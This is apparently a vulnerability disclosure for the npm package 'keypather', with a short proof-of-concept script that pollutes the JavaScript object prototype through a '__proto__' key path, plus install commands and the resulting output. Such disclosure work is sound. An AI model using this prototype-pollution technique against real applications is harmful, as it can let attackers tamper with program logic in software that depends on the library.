# Description

`keypather` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
const set = require('keypather/set')
var obj = {}
console.log("Before : " + {}.polluted);
set({}, '__proto__.polluted', 'Yes! Its Polluted');
console.log("After : " + {}.polluted);
```


2. Execute the following commands in terminal:

```
npm i keypather # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
